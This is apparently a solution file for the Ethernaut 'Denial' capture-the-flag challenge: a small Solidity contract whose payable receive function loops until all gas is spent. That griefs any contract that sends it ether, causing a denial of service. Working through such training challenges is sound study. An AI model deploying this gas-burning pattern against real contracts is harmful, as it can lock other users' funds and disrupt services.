// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// https://docs.eridian.xyz/ethereum-dev/defi-challenges/ethernaut/level-20-denial

contract AttackContract {
    uint256 counter;

    function burn() internal {
        while (gasleft() > 0) {
            counter += 1;
        }
    }

    receive() external payable {
        burn();
    }
}
